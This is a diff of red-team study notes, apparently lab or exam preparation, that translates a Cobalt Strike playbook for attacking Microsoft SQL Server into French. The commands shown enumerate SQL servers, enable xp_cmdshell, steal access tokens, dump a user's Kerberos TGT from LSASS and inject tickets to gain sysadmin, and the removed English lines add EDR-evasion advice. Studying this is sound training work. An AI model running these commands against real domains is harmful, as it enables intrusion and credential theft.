@@ -1,8 +1,8 @@
 # Microsoft SQL Server
 
-Attack chain: Enumerate SQL servers → Identify high-privilege principals → Impersonate to gain sysadmin → Execute CLR payload for code execution → Move laterally via SQL links → Escalate via SeImpersonatePrivilege.
+**Parcours :** énumérer les serveurs SQL → identifier les comptes privilégiés → vérifier le rôle `sysadmin` → étudier SQL CLR → comprendre le Lateral Movement via Linked Servers → examiner `SeImpersonatePrivilege`.
 
-**Why SQL servers matter:** SQL servers often run as a domain service account with elevated privileges (`SeImpersonatePrivilege`). Sysadmin users can execute OS code via CLR. Linked servers allow pivoting deeper into segmented networks without direct attacker connectivity.
+**Pourquoi SQL Server ?** Les instances SQL utilisent des comptes de service dont les droits doivent être vérifiés. SQL CLR et les Linked Servers peuvent étendre les possibilités d’exécution et de connexion entre machines.
 
 * [Load SQL-BOF](#load-sql-bof-aggressor-script)
 * [SQL Enumeration](#sql-enumeration)
@@ -13,47 +13,47 @@ Attack chain: Enumerate SQL servers → Identify high-privilege principals → I
 
 ---
 
-## Load SQL-BOF Aggressor Script
+## Charger le script SQL-BOF Aggressor
 
-Before running any `sql-*` commands, load the SQL-BOF CNA script:
+Avant d’utiliser les commandes `sql-*`, charger le script CNA SQL-BOF :
 
 **Cobalt Strike → Script Manager → Load → `C:\Tools\SQL-BOF\SQL\SQL.cna`**
 
-> `OPSEC-SAFE` — SQL-BOF uses Beacon Object Files (BOFs). BOFs execute directly inside the beacon thread without spawning a child process. All `sql-*` commands below run in-beacon.
+> `OPSEC-SAFE` dans ces notes — SQL-BOF utilise des Beacon Object Files (BOF) exécutés dans le contexte du Beacon, sans lancer systématiquement un processus enfant.
 
 ---
 
-## SQL Enumeration
+## Énumération SQL
 
-**Why:** Before touching any SQL server, you must identify which servers exist, how they authenticate, and whether your current user has any standing privileges. Starting blind wastes time and risks triggering alerts on servers you have no path through.
+**Objectif :** identifier les serveurs SQL, leurs modes d’authentification et les permissions de l’utilisateur courant avant toute autre opération.
 
-### Find SQL servers via SPN (Kerberos-registered instances)
+### Identifier les instances SQL avec leurs SPN
 
 ```
 ldapsearch (&(samAccountType=805306368)(servicePrincipalName=MSSQLSvc*)) --attributes name,samAccountName,servicePrincipalName
 ```
 
-> `OPSEC-SAFE` — LDAP query runs over the existing domain connection inside the beacon. No child process.  
-> `samAccountType=805306368` = user/computer accounts. MSSQLSvc SPN means the SQL instance is configured for Kerberos authentication. The SPN format `MSSQLSvc/hostname:port` also tells you the exact service principal name you need to request tickets for later.
+> `OPSEC-SAFE` dans ces notes — requête LDAP effectuée depuis la connexion au domaine du Beacon.  
+> `samAccountType=805306368` identifie les comptes utilisateurs dans Active Directory. Un SPN `MSSQLSvc/hostname:port` permet d’identifier le service SQL déclaré pour Kerberos.
 
-### Find SQL/DB-related groups (reveals who has sysadmin)
+### Rechercher les groupes SQL et leurs membres
 
 ```
 ldapsearch (&(samAccountType=268435456)(|(name=*SQL*)(name=*DB*)(name=*Database*))) --attributes distinguishedName,member
 ```
 
-> `OPSEC-SAFE` — LDAP query only.  
-> `samAccountType=268435456` = security groups. You are looking for groups whose members may have sysadmin roles on the SQL instance. This reveals the attack path: find a domain user who is a member of a SQL admin group, then impersonate that user.
+> `OPSEC-SAFE` dans ces notes — interrogation LDAP.  
+> `samAccountType=268435456` identifie les groupes de sécurité. Examiner les groupes liés à SQL et leurs membres aide à comprendre les rôles accordés sur les instances.
 
-### Port scan for SQL instances (fallback when no SPNs)
+### Rechercher les instances SQL par port
 
 ```
 portscan 10.10.120.0/23 1433 arp 1024
 ```
 
-> `OPSEC-CAUTION` — ARP-based network scan generates significant traffic and can trigger NDR/IDS. Use only when LDAP SPN enumeration yields nothing.
+> `OPSEC-CAUTION` — un scan réseau basé sur ARP génère du trafic observable par les systèmes IDS/NDR. Vérifier les règles du lab avant de l’utiliser.
 
-### Query specific SQL instance details
+### Vérifier les informations d’une instance SQL
 
 ```
 sql-1434udp 10.10.120.20       # UDP broadcast — finds instance name and version without auth
@@ -62,37 +62,37 @@ sql-whoami lon-db-1            # your current login name + role on this instance
 sql-query lon-db-1 "SELECT @@SERVERNAME"   # verify which server you are connected to
 ```
 
-> `OPSEC-SAFE` — all SQL-BOF commands run via BOF in-beacon, no child process.  
-> `sql-info` is critical first step — tells you whether Windows Auth (Kerberos) or SQL Auth is in use, and whether linked servers exist.  
-> `sql-whoami` tells you if you are `public/guest` (low priv) or `sysadmin` (full control). Guest means you need to escalate via impersonation.
+> `OPSEC-SAFE` dans les notes — commandes SQL-BOF exécutées depuis le Beacon.  
+> `sql-info` présente le mode d’authentification Windows ou SQL et l’existence éventuelle de Linked Servers.  
+> `sql-whoami` indique le compte et les rôles SQL de la session, notamment `public`, `guest` ou `sysadmin`.
 
-### Check xp_cmdshell status
+### Vérifier l’état de xp_cmdshell
 
 ```sql
 sql-query lon-db-1 "SELECT name,value FROM sys.configurations WHERE name = 'xp_cmdshell'"
 ```
 
-> `OPSEC-CAUTION` — querying `sys.configurations` is logged if SQL auditing is enabled.  
-> `value=0` = disabled. **Do not enable xp_cmdshell for the exam** — it spawns `cmd.exe` as a direct child of `sqlservr.exe`, which is a Tier 1 EDR detection trigger. SQL CLR is the correct approach (code runs inside the SQL process with no child spawn).
+> `OPSEC-CAUTION` — une requête sur `sys.configurations` peut être journalisée si l’audit SQL est activé.  
+> `value=0` signifie désactivé. L’activation de `xp_cmdshell` modifie la configuration SQL et peut créer des processus enfants visibles par les outils de sécurité.
 
-### Enable xp_cmdshell (last resort, non-exam use)
+### Activer xp_cmdshell — option à risque
 
 ```
 sql-enablexp lon-db-1
 ```
 
-> `OPSEC-UNSAFE` — spawns `cmd.exe` as a child of `sqlservr.exe`. Heavily signatured by Defender and EDR products. Avoid in the exam.
+> `OPSEC-UNSAFE` dans ces notes — `xp_cmdshell` peut lancer `cmd.exe` depuis `sqlservr.exe`, ce qui est facilement observable.
 
 ---
 
 ## Impersonation
 
-**Why:** You may authenticate as a low-privilege domain user (e.g. `pchilds`) who has only `public/guest` on the SQL server. A different domain user (e.g. `rsteel`) may hold `sysadmin`. You cannot exploit sysadmin-level features (CLR, xp_cmdshell) without first authenticating as that privileged user.  
-SQL Server uses Windows authentication (Kerberos) — so "authenticating as rsteel" means presenting rsteel's Kerberos ticket or Windows access token to the SQL instance.
+**Contexte :** `pchilds` peut disposer uniquement des rôles `public/guest`, tandis que `rsteel` possède `sysadmin` dans le lab. Les permissions SQL dépendent de l’identité authentifiée.  
+Dans ce scénario, SQL Server utilise l’authentification Windows : le ticket Kerberos ou le token Windows détermine l’identité reconnue par l’instance.
 
-### Method 1 — Steal Token from a Running Process (preferred when rsteel has a process)
+### Méthode 1 — Utiliser le token d’un processus existant
 
-> `OPSEC-SAFE` — token theft stays in-process, no new process spawned.
+> `OPSEC-SAFE` dans ces notes — manipulation du token dans le processus courant, sans création de processus enfant.
 
 ```
 krb_triage                           # list all Kerberos tickets cached on this host
@@ -101,34 +101,34 @@ steal_token <pid>                    # steal rsteel's Windows access token from 
 sql-whoami lon-db-1                  # verify you now appear as rsteel with sysadmin role
 ```
 
-> `krb_triage` shows what tickets are already in memory — tells you who is logged in and whether their TGT is available.  
-> `steal_token` duplicates the access token from the target process into your beacon. Since SQL Server uses Windows/Kerberos auth, holding rsteel's token means the SQL connection will authenticate as rsteel.  
-> After confirming sysadmin access, use `rev2self` to drop the token when no longer needed.
+> `krb_triage` présente les tickets accessibles et permet d’identifier les sessions qui possèdent un TGT.  
+> `steal_token` duplique un token d’accès dans le Beacon. Les connexions réseau peuvent ensuite utiliser l’identité liée à ce token, selon leur contexte.  
+> Après les vérifications, `rev2self` permet de revenir au contexte d’identité initial.
 
-### Method 2 — Kerberos Ticket Manipulation (when no rsteel process exists)
+### Méthode 2 — Utiliser les tickets Kerberos
 
-> `OPSEC-CAUTION` — `krb_dump` touches LSASS. `make_token` creates a Type 9 logon event (Event ID 4648 in Security log).
+> `OPSEC-CAUTION` — `krb_dump` interagit avec les mécanismes de tickets Kerberos ; `make_token` crée une session de connexion de type 9 qui peut générer des événements de sécurité.
 
-**Step 1 — Dump rsteel's TGT:**
+**Étape 1 — Exporter le TGT de `rsteel` :**
 
 ```
 krb_triage                                          # confirm rsteel has a TGT cached in LSASS
 krb_dump /user:rsteel /service:krbtgt               # extract rsteel's TGT — output is base64 kirbi
 ```
 
-> `krb_dump` reads the Kerberos ticket cache from LSASS. The TGT is the master ticket — it proves rsteel's identity to the KDC and lets you request any service ticket on rsteel's behalf.
+> `krb_dump` récupère un ticket Kerberos de la session accessible. Le TGT sert à demander des tickets de service auprès du KDC.
 
-**Step 2 — Use rsteel's TGT to request an MSSQLSvc service ticket:**
+**Étape 2 — Demander un ticket de service MSSQLSvc :**
 
 ```
 krb_asktgs /service:MSSQLSvc/lon-db-1.contoso.com:1433 /ticket:[base64-TGT-from-above]
 ```
 
-> This asks the KDC: "I have rsteel's TGT, give me a service ticket for `MSSQLSvc/lon-db-1:1433`."  
-> The KDC validates the TGT and returns a service ticket encrypted with the SQL service account's key. When presented to lon-db-1, it proves you are rsteel — no password needed.  
-> The SPN (`MSSQLSvc/lon-db-1.contoso.com:1433`) must match exactly what the SQL server is registered as — use the output from the earlier LDAP SPN enumeration.
+> Cette demande vise le service Kerberos `MSSQLSvc/lon-db-1:1433` à l’aide du TGT indiqué.  
+> Le KDC valide la demande puis délivre un ticket de service protégé par la clé du compte de service SQL.  
+> Le SPN `MSSQLSvc/lon-db-1.contoso.com:1433` doit correspondre au service enregistré dans Active Directory.
 
-**Step 3 — Save and inject the service ticket:**
+**Étape 3 — Enregistrer et importer le ticket :**
 
 ```powershell
 [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\mssql.kirbi", [Convert]::FromBase64String("[base64-ST-output]"))
@@ -141,9 +141,9 @@ run klist                                # verify ticket appears in klist output
 sql-whoami lon-db-1                      # confirm sysadmin role
 ```
 
-> `make_token` creates a Type 9 (NewCredentials) logon session. The password you supply is **never validated against AD** — this is by design for network logon sessions. Kerberos tickets override NTLM.  
-> `kerberos_ticket_use` injects the .kirbi into the beacon's Kerberos cache so subsequent network connections use it.  
-> Delete the .kirbi file from disk after use: `rm C:\Users\Attacker\Desktop\mssql.kirbi`
+> `make_token` crée une session `NewCredentials` de type 9. La validation des identifiants réseau intervient lors de leur utilisation, selon les mécanismes d’authentification disponibles.  
+> `kerberos_ticket_use` charge le fichier `.kirbi` dans la session Kerberos du Beacon.  
+> Une fois le lab terminé, supprimer le fichier `.kirbi` temporaire : `rm C:\Users\Attacker\Desktop\mssql.kirbi`
 
 ---
 
